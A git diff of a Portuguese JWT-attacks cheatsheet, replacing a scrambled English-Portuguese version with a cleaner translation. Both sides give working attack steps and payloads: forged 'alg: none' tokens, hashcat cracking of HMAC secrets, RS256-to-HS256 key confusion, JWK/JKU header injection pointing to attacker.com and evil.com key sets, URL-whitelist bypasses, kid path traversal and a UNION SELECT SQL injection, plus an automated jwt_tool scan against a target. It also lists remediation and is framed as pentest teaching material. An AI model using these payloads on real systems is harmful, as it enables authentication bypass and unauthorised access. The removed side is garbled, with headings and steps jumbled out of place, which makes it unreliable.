@@ -1,12 +1,16 @@
-# 🎟️ JWT-Attacks — Guia de referência completo
-
 <!-- language-home-navigation -->
-[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🎟️ Ataques JWT - Cheatsheet completo
 
+[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
 ```
        ██╗██╗    ██╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗
        ██║██║    ██║╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝
@@ -16,87 +20,81 @@
    ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
              JSON Web Token Exploitation & Security Testing Guide
 ```
-
-<p align="center">
-  <img src="https://img.shields.io/badge/JWT-Attacks-orange?style=for-the-badge" alt="JWT Attacks">
+<p alinhar="centro">
+  <img src="https://img.shields.io/badge/JWT-Attacks-orange?style=for-the-badge" alt="Ataques JWT">
   <img src="https://img.shields.io/badge/jwt_tool-Automated_Testing-blue?style=for-the-badge" alt="jwt_tool">
-  <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="Key Attacks">
-  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="API Testing">
+  <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="Ataques-chave">
+  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="Teste de API">
 </p>
 
-<p align="center">
-  <b>🛡️ Comprehensive methodology and practical commands for exploiting JSON Web Token (JWT) vulnerabilities</b>
+<p alinhar="centro">
+  <b>🛡️ Metodologia abrangente e comandos práticos para explorar vulnerabilidades JSON Web Token (JWT)</b>
 </p>
 
 ---
 
 ## 📋 Índice
 
-- [Introdução](#-introduction--anatomy-of-a-jwt)
-- [Essential Testing Tools](#-essential-testing-tools)
-- [Vulnerability Matrix & Attack Vectors](#-vulnerability-matrix--attack-vectors)
-  - [1. None Algorithm Flaw (`alg: "none"`)](#1-none-algorithm-flaw-alg-none)
-  - [2. Weak HMAC Secret Cracking (HS256)](#2-weak-hmac-secret-cracking-hs256)
-  - [3. Algorithm Confusion / Key Confusion (RS256 -> HS256)](#3-algorithm-confusion--key-confusion-rs256---hs256)
-  - [4. JWK (JSON Web Key) Header Injection](#4-jwk-json-web-key-header-injection)
-  - [3. Sign the token with your matching private key.](#5-jku-jwk-set-url-misconfiguration--ssrf)
-  - [> - `https://trusted.com@attacker.com/jwks.json`](#6-kid-key-id-header-manipulation--injections)
-  - [Inject a known static string:](#7-cross-service-relaying--sensitive-data-leakage)
-- [Automating Tests with `jwt_tool`](#-automating-tests-with-jwt_tool)
-- [Cracking JWT Secrets with Hashcat](#-cracking-jwt-secrets-with-hashcat)
-- [Referência rápida](#-quick-reference-table)
-- [Remediation & Secure Implementation](#-remediation--secure-implementation)
-- [Legal Disclaimer](#-legal-disclaimer)
-- [Recursos e referências](#-resources)
+- [Introdução e anatomia de um JWT](#-introdução--anatomia-de-a-jwt)
+- [Ferramentas de teste essenciais](#-essential-testing-tools)
+- [Matriz de vulnerabilidade e vetores de ataque](#-matriz de vulnerabilidade--vetores de ataque)
+  - [1. Nenhuma falha no algoritmo (`alg: "none"`)](#1-none-algorithm-flaw-alg-none)
+  - [2. Quebra fraca de segredo HMAC (HS256)](#2-fraca-hmac-secret-cracking-hs256)
+  - [3. Confusão de algoritmo/confusão de chave (RS256 -> HS256)](#3-algorithm-confusion--key-confusion-rs256---hs256)
+  - [4. Injeção de cabeçalho JWK (chave da Web JSON)](#4-jwk-json-web-key-header-injection)
+  - [5. Configuração incorreta de JKU (URL de definição de JWK) e SSRF](#5-jku-jwk-set-url-misconfiguration--ssrf)
+  - [6. Manipulação e injeções de cabeçalho KID (ID-chave)](#6-kid-key-id-header-manipulation--injections)
+  - [7. Retransmissão entre serviços e vazamento de dados confidenciais](#7-retransmissão entre serviços - vazamento de dados confidenciais)
+- [Automatizando testes com `jwt_tool`](#-automating-tests-with-jwt_tool)
+- [Quebrando segredos JWT com Hashcat](#-cracking-jwt-secrets-with-hashcat)
+- [Tabela de referência rápida](#-tabela de referência rápida)
+- [Remediação e implementação segura](#-remediação--implementação segura)
+- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)
+- [Recursos](#-recursos)
 
 ---
 
-## 🎯 Introdução
+## 🎯 Introdução e anatomia de um JWT
 
-A **JSON Web Token (JWT)** is a compact, URL-safe means of representing claims between two parties. Commonly used for session authentication in modern REST APIs, Single Page Applications (SPAs), and microservices.
+Um **JSON Web Token (JWT)** é um meio compacto e seguro para URL de representar reivindicações entre duas partes. Comumente usado para autenticação de sessão em APIs REST modernas, aplicativos de página única (SPAs) e microsserviços.
 
-A standard JWT consists of three Base64URL-encoded parts separated by dots (`.`):
-
+Um JWT padrão consiste em três partes codificadas em Base64URL separadas por pontos (`.`):
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoidXNlciJ9.4z7kE8l...
 [------------- HEADER -------------].[-------------- PAYLOAD --------------].[----------- SIGNATURE -----------]
 ```
-
-1. **Header:** Identifies the token type and the cryptographic algorithm used (e.g., `HS256`, `RS256`, `none`).
-2. **Payload:** Contains the claims (e.g., `user_id`, `role`, expiration `exp`). *Note: Payloads are encoded, NOT encrypted!*
-A standard JWT consists of three Base64URL-encoded parts separated by dots (`.`):
+1. **Cabeçalho:** Identifica o tipo de token e o algoritmo criptográfico utilizado (por exemplo, `HS256`, `RS256`, `none`).
+2. **Carga útil:** Contém as declarações (por exemplo, `user_id`, `role`, expiração `exp`). *Observação: as cargas úteis são codificadas, NÃO criptografadas!*
+3. **Assinatura:** Criada por hash do cabeçalho e da carga útil codificados usando uma chave secreta ou chave privada.
 
 ---
 
-## 🛠️ Essential Testing Tools
+## 🛠️ Ferramentas de teste essenciais
 
-3. **Signature:** Created by hashing the encoded Header and Payload using a secret key or private key.
-2. **Hashcat:** Fast GPU-based HMAC secret cracking (Mode `16500`).
-3. **Burp Suite Extension:** "JWT Editor" by Fraser Winterborn (in PortSwigger BApp Store).
+1. **jwt_tool:** Kit de ferramentas de linha de comando para analisar, testar e quebrar JWTs.
+2. **Hashcat:** Rápida quebra de segredo HMAC baseada em GPU (Modo `16500`).
+3. **Extensão Burp Suite:** "JWT Editor" de Fraser Winterborn (na PortSwigger BApp Store).
 
-### 🛠️ Essential Testing Tools
-
+### Instalando `jwt_tool`
 ```bash
 git clone https://github.com/ticarpi/jwt_tool
 cd jwt_tool
 python3 -m pip install -r requirements.txt
 alias jwt_tool='python3 /opt/jwt_tool/jwt_tool.py'
 ```
-
 ---
 
-## 💥 Vulnerability Matrix & Attack Vectors
+## 💥 Matriz de vulnerabilidade e vetores de ataque
 
-### 1. None Algorithm Flaw (`alg: "none"`)
+### 1. Nenhuma falha no algoritmo (`alg: "none"`)
 
-**Mechanism:**
-Some JWT verification libraries consider tokens valid if the `alg` header is set to `none`, completely bypassing signature verification.
+**Mecanismo:**
+Algumas bibliotecas de verificação JWT consideram os tokens válidos se o cabeçalho `alg` estiver definido como `none`, ignorando completamente a verificação de assinatura.
 
-**Exploitation:**
-1. None Algorithm Flaw (`alg: "none"`)
-2. Modify payload claims (e.g., `"role": "admin"`).
-Mechanism:
-
+**Exploração:**
+1. Decodifique o cabeçalho e altere `"alg": "HS256"` para `"alg": "none"`.
+2. Modifique as declarações de carga útil (por exemplo, `"role": "admin"`).
+3. Remova a parte da assinatura (mantenha o ponto final!).
 ```bash
 # Using jwt_tool to forge 'none' algorithm token
 python3 jwt_tool.py <TOKEN> -X a
@@ -104,20 +102,18 @@ python3 jwt_tool.py <TOKEN> -X a
 # Test various casing variations (none, None, NONE, nOnE)
 python3 jwt_tool.py <TOKEN> -T -S none
 ```
-
-*Manual Token Structure:*
+*Estrutura manual do token:*
 ```text
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
 ```
-
 ---
 
-### 2. Weak HMAC Secret Cracking (HS256)
+### 2. Fraca quebra secreta do HMAC (HS256)
 
-**Mechanism:**
-If the server signs tokens using symmetric algorithms (`HS256`, `HS384`, `HS512`) with a guessable or weak secret key (e.g., `secret`, `admin123`, company name), an attacker can brute-force the secret offline and sign arbitrary tokens.
+**Mecanismo:**
+Se o servidor assinar tokens usando algoritmos simétricos (`HS256`, `HS384`, `HS512`) com uma chave secreta adivinhada ou fraca (por exemplo, `secret`, `admin123`, nome da empresa), um invasor poderá usar força bruta no segredo off-line e assinar tokens arbitrários.
 
-**Cracking with Hashcat:**
+**Cracking com Hashcat:**
 ```bash
 # Save the full JWT to a file
 echo "eyJhbGciOi..." > jwt.txt
@@ -125,58 +121,53 @@ echo "eyJhbGciOi..." > jwt.txt
 # Crack using Hashcat Mode 16500 (JWT Secret)
 hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
 ```
-
-**Forging Token After Cracking:**
+**Forjando token após crackear:**
 ```bash
 python3 jwt_tool.py <TOKEN> -T -S hs256 -p 'discovered_secret'
 ```
-
 ---
 
-### 3. Algorithm Confusion / Key Confusion (RS256 -> HS256)
+### 3. Confusão de algoritmo/confusão de chave (RS256 -> HS256)
 
-**Mechanism:**
-- **RS256 (Asymmetric)**: Signed with the server's private key; verified with the server's **public key**.
-- **HS256 (Symmetric)**: Signed and verified with the **same shared secret**.
+**Mecanismo:**
+- **RS256 (Assimétrico):** Assinado com a chave privada do servidor; verificado com a **chave pública** do servidor.
+- **HS256 (Simétrico):** Assinado e verificado com o **mesmo segredo compartilhado**.
 
-3. Algorithm Confusion / Key Confusion (RS256 -> HS256)
-1. Obtain the server's public key (often publicly exposed at `/.well-known/jwks.json` or certificates).
-Mechanism:
-RS256 (Asymmetric)**: Signed with the server's private key; verified with the server's **public key**.
-4. The server receives the token, sees `HS256`, and verifies the signature using its configured verification key (which is its public key), resulting in a valid signature!
+Se a biblioteca de back-end não aplicar estritamente os tipos de algoritmo, um invasor poderá:
+1. Obtenha a chave pública do servidor (geralmente exposta publicamente em `/.well-known/jwks.json` ou certificados).
+2. Altere o cabeçalho do algoritmo do token de `RS256` para `HS256`.
+3. Assine o token modificado com a **chave pública** do servidor como segredo HMAC!
+4. O servidor recebe o token, vê `HS256` e verifica a assinatura usando sua chave de verificação configurada (que é sua chave pública), resultando em uma assinatura válida!
 
-**Exploitation via `jwt_tool`:**
+**Exploração via `jwt_tool`:**
 ```bash
 # Supply the server's public key and perform key confusion
 python3 jwt_tool.py <TOKEN> -X k -pk public.pem
 ```
-
 ---
 
-### 4. JWK (JSON Web Key) Header Injection
+### 4. Injeção de cabeçalho JWK (chave da Web JSON)
 
-**Mechanism:**
-The JWT specification allows an embedded public key in the `jwk` header parameter. Vulnerable servers trust this header key to verify the signature without checking if the key belongs to a trusted CA or pre-shared whitelist.
+**Mecanismo:**
+A especificação JWT permite uma chave pública incorporada no parâmetro de cabeçalho `jwk`. Servidores vulneráveis ​​confiam nesta chave de cabeçalho para verificar a assinatura sem verificar se a chave pertence a uma CA confiável ou a uma lista de permissões pré-compartilhada.
 
-**Exploitation:**
-4. JWK (JSON Web Key) Header Injection
-2. Embed the public key in the `jwk` header.
-Mechanism:
-
+**Exploração:**
+1. Gere um par de chaves RSA do invasor.
+2. Incorpore a chave pública no cabeçalho `jwk`.
+3. Assine o token com sua chave privada correspondente.
 ```bash
 # Inject self-signed key in header using jwt_tool
 python3 jwt_tool.py <TOKEN> -X i
 ```
-
 ---
 
-### 3. Sign the token with your matching private key.
+### 5. Configuração incorreta de JKU (URL de definição de JWK) e SSRF
 
-**Mechanism:**
-The `jku` (JWK Set URL) header specifies a remote URL from which the server should fetch the public key set to verify the token.
+**Mecanismo:**
+O cabeçalho `jku` (JWK Set URL) especifica uma URL remota da qual o servidor deve buscar o conjunto de chave pública para verificar o token.
 
-**Exploitation:**
-5. JKU (JWK Set URL) Misconfiguration & SSRF
+**Exploração:**
+1. Hospede seu próprio `jwks.json` em um servidor web invasor:
    ```json
    {
      "keys": [
@@ -190,7 +181,7 @@ The `jku` (JWK Set URL) header specifies a remote URL from which the server shou
      ]
    }
    ```
-Mechanism:
+2. Modifique o cabeçalho do token:
    ```json
    {
      "alg": "RS256",
@@ -199,22 +190,22 @@ Mechanism:
      "kid": "attacker-key"
    }
    ```
-3. Sign the token with your private key.
+3. Assine o token com sua chave privada.
 
-> **Bypassing URL Whitelists:**
-> If the application validates domain endings, test open redirects or URL parsing quirks:
-2. Modify the token header:
-> - `https://trusted.com.attacker.com/jwks.json`
-3. Sign the token with your private key.
+> **Ignorando listas de permissões de URL:**
+> Se o aplicativo validar terminações de domínio, teste redirecionamentos abertos ou peculiaridades de análise de URL:
+> -`https://trusted.com@attacker.com/jwks.json`
+> -`https://trusted.com.attacker.com/jwks.json`
+> - Redirecionamento aberto: `https://trusted.com/redirect?url=http://attacker.com/jwks.json`
 
 ---
 
-### > - `https://trusted.com@attacker.com/jwks.json`
+### 6. Manipulação e injeções de cabeçalho KID (Key ID)
 
-> - Open redirect: `https://trusted.com/redirect?url=http://attacker.com/jwks.json`
+O cabeçalho `kid` é uma string usada para identificar qual chave deve ser carregada de um banco de dados ou sistema de arquivos.
 
-#### A. Directory Traversal to Empty File (`/dev/null`)
-If the server reads the key file from disk using `kid`:
+#### A. Travessia de diretório para arquivo vazio (`/dev/null`)
+Se o servidor ler o arquivo de chave do disco usando `kid`:
 ```json
 {
   "alg": "HS256",
@@ -222,14 +213,14 @@ If the server reads the key file from disk using `kid`:
   "kid": "/dev/null"
 }
 ```
-Sign the token with an empty secret (`""` / 0 bytes)!
+Assine o token com um segredo vazio (`""`/0 bytes)!
 
-#### B. SQL Injection via KID
-A. Directory Traversal to Empty File (`/dev/null`)
+#### B. Injeção de SQL via KID
+Se o servidor buscar o segredo de um banco de dados:
 ```sql
 SELECT secret FROM keys WHERE kid = 'INPUT';
 ```
-Inject a known static string:
+Injete uma string estática conhecida:
 ```json
 {
   "alg": "HS256",
@@ -237,37 +228,33 @@ Inject a known static string:
   "kid": "key' UNION SELECT 'my_known_secret'-- -"
 }
 ```
-Sign the token using the secret `'my_known_secret'`.
+Assine o token usando o segredo `'my_known_secret'`.
 
 ---
 
-### Inject a known static string:
+### 7. Retransmissão entre serviços e vazamento de dados confidenciais
 
-- **Unencrypted PII**: Developers frequently store passwords, SSNs, or sensitive user metadata in the payload, forgetting it is only Base64URL-encoded, not encrypted.
-- **Service Confusion**: Using a token meant for a low-privilege service (e.g., analytics API) against an internal administrative API.
+- **PII não criptografadas:** Os desenvolvedores frequentemente armazenam senhas, SSNs ou metadados confidenciais do usuário na carga útil, esquecendo que ela é apenas codificada em Base64URL, não criptografada.
+- **Confusão de serviços:** uso de um token destinado a um serviço de baixo privilégio (por exemplo, API analítica) em uma API administrativa interna.
 
 ---
 
-## ⚡ Automating Tests with `jwt_tool`
+## ⚡ Automatizando testes com `jwt_tool`
 
-### Service Confusion**: Using a token meant for a low-privilege service (e.g., analytics API) against an internal administrative API.
-The easiest way to scan for all known vulnerabilities automatically:
-
+### Execute todos os ataques do Playbook integrados
+A maneira mais fácil de verificar automaticamente todas as vulnerabilidades conhecidas:
 ```bash
 # Launch full automated playbook scan
 python3 jwt_tool.py <TOKEN> -M pb -t https://target.com/api/user -rh "Authorization: Bearer <TOKEN>"
 ```
-
-### Interactive Tampering Mode
+### Modo Interativo de Adulteração
 ```bash
 # Interactively edit header or payload claims
 python3 jwt_tool.py <TOKEN> -T
 ```
-
 ---
 
-## 🔓 Cracking JWT Secrets with Hashcat
-
+## 🔓 Quebrando segredos JWT com Hashcat
 ```bash
 # 1. Format: Put token alone in a file
 echo "eyJhbGciOiJIUzI1NiIsInR5..." > jwt.txt
@@ -278,46 +265,45 @@ hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -w 3
 # 3. Rule-based attack
 hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
-
 ---
 
-## 📊 Referência rápida
+## 📊 Tabela de referência rápida
 
-|Vulnerability|Attack Technique|Key Payload / Flag|
+| Vulnerabilidade | Técnica de Ataque | Carga útil/sinalizador chave |
 |---------------|------------------|--------------------|
-|**None Algorithm**|Set `alg: "none"`, strip signature|`jwt_tool <TOKEN> -X a`|
-|**Weak Secret**|GPU dictionary brute-force|`hashcat -m 16500 jwt.txt rockyou.txt`|
-|**Algorithm Confusion**|Change RS256 to HS256, sign with public key|`jwt_tool <TOKEN> -X k -pk pub.pem`|
-|**JWK Injection**|Embed attacker public key in header|`jwt_tool <TOKEN> -X i`|
-|**JKU Injection**|Point `jku` to external server|`"jku": "http://evil.com/jwks.json"`|
-|**KID Path Traversal**|Point `kid` to `/dev/null` or known file|`"kid": "/dev/null"` (Sign with `""`)|
-|**KID SQLi**|Inject static secret into SQL query|`"kid": "' UNION SELECT 'secret'-- -"`|
+| **Nenhum Algoritmo** | Definir `alg: "none"`, assinatura de tira | `jwt_tool <TOKEN> -X a` |
+| **Segredo Fraco** | Força bruta do dicionário GPU | `hashcat -m 16500 jwt.txt rockyou.txt` |
+| **Confusão de algoritmos**| Alterar RS256 para HS256, assinar com chave pública | `jwt_tool <TOKEN> -X k -pk pub.pem` |
+| **Injeção JWK** | Incorporar a chave pública do invasor no cabeçalho | `jwt_tool <TOKEN> -X i` |
+| **Injeção JKU** | Aponte `jku` para servidor externo | `"jku": "http://evil.com/jwks.json"` |
+| **Travessia do caminho KID**| Aponte `kid` para `/dev/null` ou arquivo conhecido | `"kid": "/dev/null"` (Assine com `""`) |
+| **KID SQLi** | Injetar segredo estático na consulta SQL | `"kid": "' UNION SELECT 'secret'-- -"` |
 
 ---
 
-## 🛡️ Remediation & Secure Implementation
+## 🛡️ Correção e implementação segura
 
-1. **Explicitly Whitelist Algorithms:**
-   Never allow client-controlled `alg` selection. Hardcode allowed algorithms on the server (e.g., exclusively allow `RS256`).
-2. **Reject `alg: none` Tokens:**
-   Ensure the library strictly rejects unverified or unsigned tokens.
-3. **Use Long, Cryptographically Secure Secrets:**
-   HMAC secrets must be at least 256 bits (32+ random characters) generated by a secure CSPRNG.
-4. **Validate `jku` and `jwk` Headers:**
-Never allow client-controlled `alg` selection. Hardcode allowed algorithms on the server (e.g., exclusively allow `RS256`).
-5. **Sanitize `kid` Values:**
-Ensure the library strictly rejects unverified or unsigned tokens.
-
----
-
-## ⚠️ Legal Disclaimer
-
-> **IMPORTANT:** JWT attacks can lead to full authentication bypass and unauthorized access to application databases. This guide is strictly intended for educational purposes and authorized penetration testing.
+1. **Algoritmos explicitamente da lista de permissões:**
+   Nunca permita a seleção `alg` controlada pelo cliente. Algoritmos permitidos por código fixo no servidor (por exemplo, permitir exclusivamente `RS256`).
+2. **Rejeitar tokens `alg: none`:**
+   Certifique-se de que a biblioteca rejeite estritamente tokens não verificados ou não assinados.
+3. **Use segredos longos e criptograficamente seguros:**
+   Os segredos HMAC devem ter pelo menos 256 bits (mais de 32 caracteres aleatórios) gerados por um CSPRNG seguro.
+4. **Valide os cabeçalhos `jku` e `jwk`:**
+   Busque apenas conjuntos JWK de uma lista de permissões estrita de URLs confiáveis internos; rejeitar domínios externos fornecidos pelo usuário.
+5. **Higienizar valores `kid`:**
+   Trate `kid` como entrada de usuário não confiável; higienizar contra passagem de diretório (`../`) e injeção de SQL.
 
 ---
 
-## 📚 Recursos e referências
+## ⚠️ Isenção de responsabilidade legal
 
-- [jwt_tool GitHub Repository](https://github.com/ticarpi/jwt_tool)
-- [PortSwigger Web Security Academy: JWT Attacks](https://portswigger.net/web-security/jwt)
-- [RFC 7519 - JSON Web Token (JWT) Standard](https://datatracker.ietf.org/doc/html/rfc7519)
+> **IMPORTANTE:** Os ataques JWT podem levar ao desvio total da autenticação e ao acesso não autorizado aos bancos de dados do aplicativo. Este guia destina-se estritamente a fins educacionais e testes de penetração autorizados.
+
+---
+
+## 📚 Recursos
+
+- [Repositório jwt_tool GitHub](https://github.com/ticarpi/jwt_tool)
+- [PortSwigger Web Security Academy: ataques JWT](https://portswigger.net/web-security/jwt)
+- [RFC 7519 - Padrão JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)
